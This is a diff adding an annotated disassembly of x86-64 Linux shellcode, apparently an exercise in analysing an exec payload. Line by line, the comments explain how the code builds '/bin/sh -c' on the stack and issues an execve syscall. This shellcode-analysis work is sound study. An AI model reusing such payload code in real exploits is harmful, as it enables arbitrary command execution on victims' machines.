@@ -1,0 +1,18 @@
+0x0000000000601060 <+0>:	push   0x3b      ; push the 'execve' syscall number 59 (0x3B in HEX) onto the stack 
+0x0000000000601062 <+2>:	pop    rax       ; pop that value into RAX, RAX needs to contain the SYSCALL number
+0x0000000000601063 <+3>:	cdq              ; convert double word to quad word - extends the sign bit of RAX into the RDX register, this sets the value of RDX to 0 
+0x0000000000601064 <+4>:	movabs rbx,0x68732f6e69622f   ; move the 'hs/nib/' value (ASCII) into RBX in reverse (little-endian)
+0x000000000060106e <+14>:	push   rbx       ; push that value onto the stack
+0x000000000060106f <+15>:	mov    rdi,rsp   ; RSP is now pointing to a memory address containing the begining of our string (/bin/sh) + 00, so move this memory address into RDI
+0x0000000000601072 <+18>:	push   0x632d    ; push the WORD value 0x632d onto the stack (in the little-format this would be 0x2d63, which is "-c" in ASCII) 
+0x0000000000601077 <+23>:	mov    rsi,rsp   ; move the memory address pointed to by RSP, which contains "-c", into RSI
+0x000000000060107a <+26>:	push   rdx       ; push RDX (0) onto the stack
+0x000000000060107b <+27>:	call   0x601083 <code+35>    ; call the instruction at the memory address of 0x601083 (see the disassembled code below)
+0x0000000000601080 <+32>:	imul   esp,DWORD PTR [rax+rax*1+0x56],0xe6894857  ; push the pointer to the '0x0000000000601080' memory address onto the stack right after the above call instruction is performed
+0x0000000000601088 <+40>:	syscall          ; issue the 'execve' syscall
+
+
+0x601083 <code+35>:	push   rsi          ; push the memory address containing "-c" onto the stack
+0x601084 <code+36>:	push   rdi          ; push the memory address containing "/bin/sh + 00" onto the stack 
+0x601085 <code+37>:	mov    rsi,rsp      ; move this memory address from RSP into RSI
+0x601088 <code+40>:	syscall             ; issue the 'execve' syscall
